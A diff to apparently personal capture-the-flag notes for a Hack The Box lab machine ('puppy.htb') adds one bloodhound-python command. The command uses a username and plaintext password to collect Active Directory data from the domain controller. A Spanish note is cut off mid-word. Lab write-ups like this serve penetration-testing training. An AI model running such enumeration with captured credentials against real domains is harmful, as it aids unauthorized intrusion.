@@ -116,3 +116,12 @@ smbclient //puppy.htb/DEV -U 'PUPPY.HTB\\levi.james'
 
 ![[Pasted image 20250606133725.png]]
 
+### Bloodhound-python
+
+```python
+bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' -d 'puppy.htb' -ns 10.10.11.70 --zip -c All -dc 'dc.puppy.htb'
+```
+
+#Nota: en este ca
+
+![[Pasted image 20250606134006.png]]
